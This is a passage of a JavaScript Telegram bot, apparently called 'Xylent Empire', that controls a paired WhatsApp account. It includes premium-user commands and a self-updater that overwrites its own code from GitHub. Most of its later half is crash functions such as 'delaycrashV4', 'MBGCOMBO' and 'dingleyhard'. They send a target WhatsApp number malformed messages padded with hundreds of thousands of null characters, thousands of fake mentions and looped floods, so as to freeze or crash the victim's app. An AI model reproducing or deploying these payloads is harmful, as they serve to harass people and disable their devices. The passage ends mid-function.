\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  const list = premiumGroups.map((id, i) => `│ ${i + 1}. ${id}`).join('\n');

  await ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
    caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐋𝐈𝐒𝐓 𝐆𝐑𝐎𝐔𝐏 〕───╮
│ ◈ TOTAL : ${premiumGroups.length} Group
├──────────────────────
${list}
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});

////=========CEK PREM GROUP========\\\\
bot.command('cekpremgroup', async (ctx) => {
  const chatId = ctx.chat.id.toString();
  const status = isGroupPremium(chatId);

  await ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
    caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐒𝐓𝐀𝐓𝐔𝐒 〕───╮
│ ◈ GROUP   : ${ctx.chat.title || '-'}
│ ◈ ID      : ${chatId}
│ ◈ PREMIUM : ${status ? '✅ Aktif' : '❌ Tidak Aktif'}
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});
// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
bot.command("addsender", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("❌ Format Salah!. Example : /addsender <nomor_wa>");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (sock && sock.user) {
    return await ctx.reply("Whatsapp Sudah Terhubung");
  }

  try {
    const code = await sock.requestPairingCode(phoneNumber, "XYLENTTl");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃☇ 𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}
┃☇ 𝗖𝗼𝗱𝗲 : <code>${formattedCode}</code>
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "dєvєlσpєrs", url: "https://t.me/xyzenofficial" }]],
      },
    });
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("❌ Gagal melakukan pairing !");
  }
});
///=== comand del sesi ===\\\\
bot.command("delsesi", (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("✅ Session berhasil di hapus, silahkan connect ulang");
  } else {
    ctx.reply("❌ Tidak ada session yang tersimpan saat ini.");
  }
});
////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}

////=========COOLDOWN SYSTEM========\\\\

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != OWNER_ID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

////////// OWNER MENU \\\\\\\\\
bot.command("Status", checkOwner, checkAdmin, async (ctx) => {
  try {
    const waStatus = sock && sock.user
      ? "🟢 Connect"
      : "🔴 No Connect";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});

// ─── IMPORT CONFIG ────────────────────────────────────────────────────────
const globalConfig = require("./config.js"); 
const OWNER = globalConfig.OWNER_IDS; // Berbentuk Array: ["8768626313"]

const CONFIG = {
  RAW_URL      : "https://raw.githubusercontent.com/DAFARELXP/Xylent-Empire/main/empire.js",
  COMMITS_API  : "https://api.github.com/repos/DAFARELXP/Xylent-Empire/commits?path=empire.js&per_page=5",
  LOCAL_FILE   : path.join(__dirname, "empire.js"),
  INTERVAL_MIN : 5,
};

let autoUpdateEnabled = false;
let checkIntervalID   = null;
let lastKnownSHA      = null;

// ─── HELPERS ───────────────────────────────────────────────────────────────
function ownerOnly(ctx, next) {
  const senderId = ctx.from?.id?.toString();

  // Cek apakah ID pengirim ada di dalam array OWNER
  const isOwner = Array.isArray(OWNER_IDS) 
    ? OWNER_IDS.map(id => id.toString()).includes(senderId)
    : OWNER_IDS.toString() === senderId;

  if (!isOwner) {
    ctx.reply(
      `<blockquote>⛔ Perintah ini hanya untuk <b>owner</b>.</blockquote>`,
      { parse_mode: "HTML" }
    );
    return; // Stop eksekusi di sini
  }
  return next(); // Lanjut ke command jika benar owner
}

function httpGet(url) {
  return new Promise((resolve, reject) => {
    https.get(url, { headers: { "User-Agent": "XylentEmpireBot" } }, (res) => {
      let body = "";
      res.on("data", (chunk) => (body += chunk));
      res.on("end", () => resolve({ status: res.statusCode, body }));
    }).on("error", reject);
  });
}

async function getLatestSHA() {
  const { body } = await httpGet(CONFIG.COMMITS_API);
  const commits  = JSON.parse(body);
  if (!Array.isArray(commits) || !commits[0]) throw new Error("Commit list kosong");
  return commits[0].sha;
}

async function downloadFile() {
  const response = await axios.get(CONFIG.RAW_URL, { timeout: 10000 });
  const newData  = response.data;

  if (!newData || typeof newData !== "string") {
    throw new Error("File dari server kosong atau tidak valid.");
  }

  if (fs.existsSync(CONFIG.LOCAL_FILE)) {
    fs.copyFileSync(CONFIG.LOCAL_FILE, CONFIG.LOCAL_FILE + ".bak");
  }

  fs.writeFileSync(CONFIG.LOCAL_FILE, newData, "utf-8");
  console.log(`[AutoUpdate] File berhasil ditulis ke: ${CONFIG.LOCAL_FILE}`);
}

async function checkUpdate(chatId = null) {
  try {
    const sha     = await getLatestSHA();
    const isFirst = lastKnownSHA === null;

    if (sha === lastKnownSHA) {
      if (chatId) {
        bot.telegram.sendMessage(chatId,
          `<blockquote>✅ <b>Tidak ada update baru.</b>\n\n` +
          `Sistem sudah menggunakan versi terbaru.\n\n` +
          `<i>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 Auto-Update System</i></blockquote>`,
          { parse_mode: "HTML" }
        );
      }
      return;
    }

    if (isFirst) {
      lastKnownSHA = sha;
      console.log(`[AutoUpdate] Terhubung. Sistem siap memantau pembaruan terbaru.`);
      if (chatId) {
        bot.telegram.sendMessage(chatId,
          `<blockquote>✅ <b>Sistem Siap!</b>\n\n` +
          `Siap memantau pembaruan terbaru dari owner.\n\n` +
          `<i>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 Auto-Update System</i></blockquote>`,
          { parse_mode: "HTML" }
        );
      }
      return;
    }

    // JIKA ADA UPDATE BARU
    lastKnownSHA = sha;
    await downloadFile();

    // Tentukan target chat aman (Gunakan ID pengirim, atau index pertama dari array owner jika otomatis)
    const targetChat = chatId || (Array.isArray(OWNER_IDS) ? OWNER_IDS[0] : OWNER_IDS);

    await bot.telegram.sendMessage(targetChat,
      `<blockquote>🚀 <b>Auto-Update Berhasil!</b>\n\n` +
      `Sistem akan dimuat ulang otomatis dalam 3 detik untuk menerapkan perubahan.</blockquote>`,
      { parse_mode: "HTML" }
    );

    setTimeout(() => { process.exit(); }, 3000);

  } catch (err) {
    console.error("[AutoUpdate] Error:", err.message);
    const errMsg =
      `<blockquote>❌ <b>Gagal cek update:</b>\n` +
      `<code>${err.message}</code></blockquote>`;
    
    if (bot && bot.telegram) {
      const fallbackChat = Array.isArray(OWNER_IDS) ? OWNER_IDS[0] : OWNER_IDS;
      bot.telegram.sendMessage(fallbackChat, errMsg, { parse_mode: "HTML" }).catch(() => {});
    }
  }
}

async function startAutoUpdate(chatId) {
  if (autoUpdateEnabled) {
    return bot.telegram.sendMessage(chatId,
      `<blockquote>⚠️ <b>Auto-Update sudah berjalan!</b>\n\n` +
      `Sistem pemantau pembaruan sudah aktif\n` +
      `dan sedang berjalan di latar belakang.\n\n` +
      `Gunakan /updatestatus untuk melihat status.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  autoUpdateEnabled = true;
  
  const ms        = CONFIG.INTERVAL_MIN * 60 * 1000;
  checkIntervalID = setInterval(() => checkUpdate(null), ms);

  await checkUpdate(chatId);

  bot.telegram.sendMessage(chatId,
    `<blockquote>✅ <b>Auto-Update Diaktifkan!</b>\n\n` +
    `Sistem pemantau pembaruan kini telah berjalan\n` +
    `dan siap mendeteksi perubahan terbaru secara otomatis.\n\n` +
    `┌─────────────────────────\n` +
    `│ 📦 File     : <code>empire.js</code>\n` +
    `│ ⏱ Interval : setiap <b>${CONFIG.INTERVAL_MIN} menit</b>\n` +
    `│ ⏰ Aktif    : ${new Date().toLocaleString("id-ID")}\n` +
    `└─────────────────────────\n\n` +
    `🔍 Bot akan otomatis mengecek apakah owner\n` +
    `telah mengupload file baru di GitHub.\n` +
    `Jika ada pembaruan, sistem akan langsung\n` +
    `mengunduh dan menerapkannya secara otomatis.\n\n` +
    `<i>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 Auto-Update System — Aktif</i></blockquote>`,
    { parse_mode: "HTML" }
  );
}

function stopAutoUpdate(chatId) {
  if (!autoUpdateEnabled) {
    return bot.telegram.sendMessage(chatId,
      `<blockquote>⚠️ <b>Auto-Update sudah mati.</b>\n\n` +
      `Gunakan /autoupdate on untuk mengaktifkan kembali.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  clearInterval(checkIntervalID);
  checkIntervalID   = null;
  autoUpdateEnabled = false;

  bot.telegram.sendMessage(chatId,
    `<blockquote>🔴 <b>Auto-Update Dimatikan!</b>\n\n` +
    `Sistem pemantau pembaruan telah dihentikan\n` +
    `dan tidak akan mengecek perubahan apapun\n` +
    `sampai diaktifkan kembali.\n\n` +
    `┌─────────────────────────\n` +
    `│ 📦 File  : <code>empire.js</code>\n` +
    `│ ⏰ Mati  : ${new Date().toLocaleString("id-ID")}\n` +
    `└─────────────────────────\n\n` +
    `⚠️ Selama auto-update mati, sistem tidak\n` +
    `akan mendeteksi pembaruan terbaru dari owner.\n` +
    `Gunakan /checkupdate untuk cek manual,\n` +
    `atau /autoupdate on untuk mengaktifkan kembali.\n\n` +
    `<i>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 Auto-Update System — Nonaktif</i></blockquote>`,
    { parse_mode: "HTML" }
  );
}

// ─── COMMANDS ──────────────────────────────────────────────────────────────

bot.command("updatesc", ownerOnly, async (ctx) => {
  const chatId  = ctx.chat.id;
  const statusMsg = await ctx.reply("🔍 *Mengecek pembaruan sistem...*", { parse_mode: "Markdown" });

  try {
    const response    = await axios.get(CONFIG.RAW_URL, { timeout: 10000 });
    const newData     = response.data;

    if (!newData || typeof newData !== "string") {
      throw new Error("File dari server kosong atau tidak valid.");
    }

    const currentData = fs.readFileSync(CONFIG.LOCAL_FILE, "utf8");
    if (newData === currentData) {
      return ctx.telegram.editMessageText(
        chatId,
        statusMsg.message_id,
        undefined,
        "Sistem sudah dalam versi terbaru. ✅"
      );
    }

    if (fs.existsSync(CONFIG.LOCAL_FILE)) {
      fs.copyFileSync(CONFIG.LOCAL_FILE, CONFIG.LOCAL_FILE + ".bak");
    }
    fs.writeFileSync(CONFIG.LOCAL_FILE, newData, "utf-8");

    await ctx.telegram.editMessageText(
      chatId,
      statusMsg.message_id,
      undefined,
      "🚀 *Update Berhasil!*\n\nSistem akan melakukan restart otomatis dalam 3 detik untuk menerapkan perubahan.",
      { parse_mode: "Markdown" }
    );

    setTimeout(() => { process.exit(); }, 3000);

  } catch (e) {
    console.error("Update Error:", e.message);
    if (fs.existsSync(CONFIG.LOCAL_FILE + ".bak")) {
      fs.copyFileSync(CONFIG.LOCAL_FILE + ".bak", CONFIG.LOCAL_FILE);
    }
    ctx.reply(`❌ *Update Gagal!*\nTerjadi kesalahan: \`${e.message}\``, { parse_mode: "Markdown" });
  }
});

bot.command("autoupdate", ownerOnly, async (ctx) => {
  const args   = ctx.message.text.split(" ");
  const action = (args[1] || "").toLowerCase();

  if (action === "on")       await startAutoUpdate(ctx.chat.id);
  else if (action === "off") stopAutoUpdate(ctx.chat.id);
  else ctx.reply("Gunakan: /autoupdate on atau /autoupdate off");
});

bot.command("checkupdate", ownerOnly, async (ctx) => {
  await ctx.reply(
    `<blockquote>🔍 <b>Memeriksa Pembaruan...</b>\n\n` +
    `Sistem sedang menghubungi GitHub Repository.\n` +
    `Mohon tunggu sebentar...</blockquote>`,
    { parse_mode: "HTML" }
  );
  await checkUpdate(ctx.chat.id);
});

bot.command("updatestatus", ownerOnly, (ctx) => {
  ctx.reply(
    `<blockquote>📊 <b>Status Auto-Update</b>\n\n` +
    `┌─────────────────────────\n` +
    `│ 🔌 Status   : ${autoUpdateEnabled ? "🟢 AKTIF" : "🔴 MATI"}\n` +
    `│ ⏱ Interval : ${CONFIG.INTERVAL_MIN} menit\n` +
    `│ 📦 File     : <code>empire.js</code>\n` +
    `└─────────────────────────\n\n` +
    `<i>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 Auto-Update System</i></blockquote>`,
    { parse_mode: "HTML" }
  );
});

/////////////////START FUNC/////////////////////////
async function CrmXcarousel(sock, target) {
  const imageHeader = {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
    fileLength: "11887",
    height: 1010,
    width: 1090,
    mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
    fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
    directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1750124469",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/PPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tej6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSGDWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
    contextInfo: {
      pairedMediaType: "NOT_PAIRED_MEDIA",
      isQuestion: true,
      isGroupStatus: true
    },
    scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
    scanLengths: [
      9999999999999999999,
      9999999999999999999,
      9999999999999999999,
      9999999999999999999
    ],
    midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
  };

  const messageBody = { text: "\u0010" };
  const messageFlow = { buttons: "\0".repeat(510000) };

  const finalMessage = {
  groupStatusMessageV2: {
    message: {
      interactiveMessage: {
        header: {
          title: "CRM",
          hasMediaAttachment: true,
          imageMessage: imageHeader
        },
        body: messageBody,
        nativeFlowMessage: messageFlow
      },
      nativeFlowResponseMessage: {
        name: "payment_method",
        paramsJson: `{"reference_id":null,"payment_method":"${"\u0010".repeat(5000)}","payment_timestamp":null,"share_payment_status":true}`,
        version: 3
      }
    }
  }
};

  await sock.relayMessage(target, finalMessage, {
    participant: {
      jid: target
    }
  });
}

async function delaycrashV4(sock, target) {
  try {
    let msg = await generateWAMessageFromContent(
      target,
      {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "#NullStrick",
                format: "DEFAULT"
              },
              contextInfo: {
                participant: target,
                stanzaId: sock.generateMessageTag(),
                isForwarded: true,
                forwardingScore: 999,
                mentionedJid: Array.from({ length: 2000 }, (_, r4) => `628${666 + r4}@s.whatsapp.net`),
                statusAttributionType: 2,
                statusAttributions: Array.from({ length: 1000 }, (_, r) => ({  participant: `62${r + 666}@s.whatsapp.net`, type: 1 }))
              },
              nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: "\u0000".repeat(900000),
                version: 3
              }
            }
          }
        }
      },
      {}
    );
    
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
    });
    
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    });

  } catch (err) {
    console.error("Error:", err);
  }
}

async function MBGCOMBO(sock, target) {
    let RX7 = await generateWAMessageFromContent(
        target,
        {
      interactiveMessage: {
        header: {
          title: "Xylent Empire\n\n" + "ꦽ".repeat(50000) + "@5".repeat(50000),
          hasMediaAttachment: false
        },
        body: {
          text: "Xylent Empire WAS HERE",
        },
        nativeFlowMessage: {
          messageParamsJson: "",
          buttons: [
            { name: "single_select", buttonParamsJson:  "\u0000" },
            { name: "payment_method", buttonParamsJson:  "\u0000" },
            { name: "call_permission_request", buttonParamsJson:  "\u0000", voice_call: "call_galaxy" },
            { name: "form_message", buttonParamsJson:  "\u0000" },
            { name: "catalog_message", buttonParamsJson:  "\u0000" },
            { name: "send_location", buttonParamsJson:  "\u0000" },
            { name: "view_product", buttonParamsJson:  "\u0000" },
            { name: "payment_status", buttonParamsJson: "\u0000" },
            { name: "cta_call", buttonParamsJson: "\u0000" },
            { name: "cta_url", buttonParamsJson:  "\u0000" },
            { name: "review_and_pay", buttonParamsJson:  "\u0000" }
          ]
        }
      }
     }, { participant: { jid: target}});
  await sock.relayMessage(target, RX7, {
    messageId: RX7.key.id,
    userJid: target,
    participant: { jid: target },
  });

await sock.relayMessage(target, {
   groupStatusMessageV2: {  
    message: {
      interactiveResponseMessage: {
        body: {
          text: "Xylent Empire",
          format: "EXTENSION_1"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"RanstechZvX@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"ok\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
          version: 3
        },
        contextInfo: {
         forwardingScore: 9999,
         isForwarded: true,
         entryPointConversionSource: "payment_method"
        }
      }
    }
   }
  }, { participant: { jid: target }});

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Xylent Empire",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target }});
}

async function dingleyhard(sock, target, ptcp = true) {
  const mentionedJidList = [
    "0@s.whatsapp.net",
    ...Array.from({ length: 1917 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
  ];

  const callPermissionMessage = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "𝖠𝗌𝖾𝗉𝖷𝟩",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(10000),
            version: 3
          },
          contextInfo: {
            mentionedJid: mentionedJidList
          }
        }
      }
    }
  };

  const addressMessage = {
    interactiveResponseMessage: {
      body: {
        text: "\u0000".repeat(7000),
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\
                    "values": {\
                        "in_pin_code": "999999",\
                        "building_name": "KANJUT",\
                        "landmark_area": "H",\
                        "address": "XT",\
                        "tower_number": "XTX",\
                        "city": "Garut",\
                        "name": "Jawa_Barat",\
                        "phone_number": "999999999999",\
                        "house_number": "xxx",\
                        "floor_number": "xxx",\
                        "state": "D | ${"\u0000".repeat(900000)}"\
                    }\
                }`,
        version: 3
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 1999 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363403941803439@newsletter",
          newsletterName: "idk",
          serverMessageId: 1000,
          accessibilityText: "idk"
        },
        statusAttributionType: "RESHARED_FROM_MENTION",
        contactVcard: true,
        isSampled: true,
        dissapearingMode: {
          initiator: target,
          initiatedByMe: true
        },
        expiration: Date.now()
      },
    }
  };

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/webp",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "1173741824",
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          isAnimated: false,
          viewOnce: false,
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 1900 }, () =>
                "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            isForwarded: true,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: { 
                    text: "𝖠𝗌𝖾𝗉𝖷𝟩 𝖤𝗑𝗉𝗅𝗈𝗌𝗍", 
                    format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "call_permission_request",
                      paramsJson: "\u0000".repeat(99999),
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  for (let r = 0; r < 1000; r++) {
    const payload = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "𝖷𝟩 𝖲𝖾𝗏𝖾𝗇 𝖷",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: "\x10".repeat(1045000),
              version: 3
            },
            entryPointConversionSource: "{}"
          },
        },
      },
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: payload.message,
      },
    }, ptcp ? {
      messageId: payload.key.id,
      participant: { jid: target }
    } : {
      messageId: payload.key.id
    });
    await sleep(1000);
  }

  await sock.relayMessage(target, callPermissionMessage, {
    groupId: null,
    participant: { jid: target }
  });

  await sock.relayMessage(target, addressMessage, {
    participant: { jid: target }
  });

  const msgLite = generateWAMessageFromContent(target, stickerMsg, {});
  await sock.relayMessage("status@broadcast", msgLite.message, {
    messageId: msgLite.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });
}

async function stickerUi(sock, target) {
  try {
    const msg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            stickerPackMessage: {
              stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
              name: "ꦽ".repeat(50000) + "\u0000".repeat(10000),
              publisher: "ꦽ".repeat(50000) + "\u0000".repeat(10000),
              caption: "ꦽ".repeat(50000) + "\u0000".repeat(10000),

              stickers: [
                ...Array.from({ length: 4700 }, () => ({
                  fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                  isAnimated: false,
                  emojis: ["🦠", "🩸", "☠️", "💥"],
                  accessibilityLabel: "",
                  stickerSentTs: "#NullStrick",
                  isAvatar: true,
                  isAiSticker: true,
                  isLottie: true,
                  mimetype: "application/pdf"
                }))
              ],

              fileLength: "1073741824000",
              fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
              fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
              mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
              directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4",

              contextInfo: {
                remoteJid: "0@s.whatsapp.net",
                participant: target,
                stanzaId: "1234567890ABCDEF",
                mentionedJid: [
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 1990 }, () =>
                    `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                  )
                ],
                quotedMessage: {
                  locationMessage: {
                    degreesLongitude: 9999,
                    degreesLatitude: 9999,
                    name: "#NullStrick",
                    url: "https://Wa.me/stickerpack" + "ꦽ".repeat(10000),
                    address: "#NullStrick"
                  }
                }
              },

              mediaKeyTimestamp: "1747502082",
              trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
              thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4",
              thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
              thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
              thumbnailHeight: 252,
              thumbnailWidth: 252,
              imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
              stickerPackSize: "999999999",
              stickerPackOrigin: "USER_CREATED"
            }
          }
        }
      },
      { userJid: target }
    );
    
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
    });
  } catch (err) {
    console.error(err);
  }
}
async function button(sock, target) {
  try {
